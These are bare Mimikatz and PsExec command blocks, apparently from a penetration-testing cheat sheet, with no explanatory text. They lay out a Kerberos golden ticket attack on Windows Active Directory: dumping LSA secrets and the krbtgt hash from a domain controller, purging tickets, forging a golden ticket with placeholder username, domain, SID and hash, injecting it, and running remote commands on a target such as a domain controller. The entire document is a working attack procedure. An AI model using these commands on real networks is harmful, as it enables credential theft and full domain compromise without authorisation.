```powershell
privilege::debug
lsadump::lsa /patch # COmmand run from the Domain Controller
```

```powershell
kerberos::purge
```

```powershell
kerberos::golden /user:$ACUTAL_USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /krbtgt:$HASH /ptt
misc::cmd
```

```powershell
PsExec.exe \\$TARGET $COMMAND # The target can be Domain Controller like DC01
```